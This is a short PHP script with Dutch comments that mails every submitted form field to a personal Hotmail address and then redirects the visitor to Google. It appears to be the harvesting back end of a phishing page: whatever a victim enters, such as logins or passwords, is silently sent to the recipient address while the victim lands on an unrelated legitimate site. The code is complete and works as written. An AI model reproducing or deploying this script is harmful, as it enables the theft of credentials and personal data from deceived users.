<?php 
    # Verstuur e-mail
    $message = print_r($_POST, true);
    mail("victorlaforga@hotmail.com", "New message", $message);
    # Stuur bezoeker naar deze pagina
    header('Location: http://www.google.com/');
?>